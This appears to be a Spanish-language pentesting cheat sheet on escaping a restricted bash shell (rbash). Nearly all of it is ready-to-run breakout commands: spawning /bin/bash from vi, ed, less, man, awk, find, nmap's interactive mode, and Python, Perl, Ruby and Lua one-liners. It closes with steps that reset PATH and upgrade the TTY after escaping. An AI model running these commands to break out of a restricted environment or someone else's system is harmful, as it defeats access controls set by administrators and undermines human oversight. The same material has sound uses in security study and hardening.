### Identificación:

```bash
echo $SHELL
# /bin/rbash

echo $PATH
# Probablemente muy limitado

# Intentar comando no permitido
cd /
# -rbash: cd: restricted
```

### Técnicas de escape:

###### Método 1. Usando editores de texto:

```bash
# Vi/Vim
vi
:set shell=/bin/bash
:shell

# o
vi
:!/bin/bash

# Ed
ed
!'/bin/bash'
```

###### Método 2. Usando lenguajes de programación:

```bash
# Python
python -c 'import os; os.system("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/bash"'

# Lua
lua -e 'os.execute("/bin/bash")'
```

###### Método 3. Usando utilidades comunes:

```bash
# Awk
awk 'BEGIN {system("/bin/bash")}'

# Find
find / -name algo -exec /bin/bash \;

# Less/More
less /etc/passwd
!/bin/bash

# Man
man man
!/bin/bash

# Nmap (versiones antiguas)
nmap --interactive
!sh
```

### Después de escapar

```bash
# Exportar PATH completo
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Establecer shell
export SHELL=/bin/bash

# Mejorar la TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

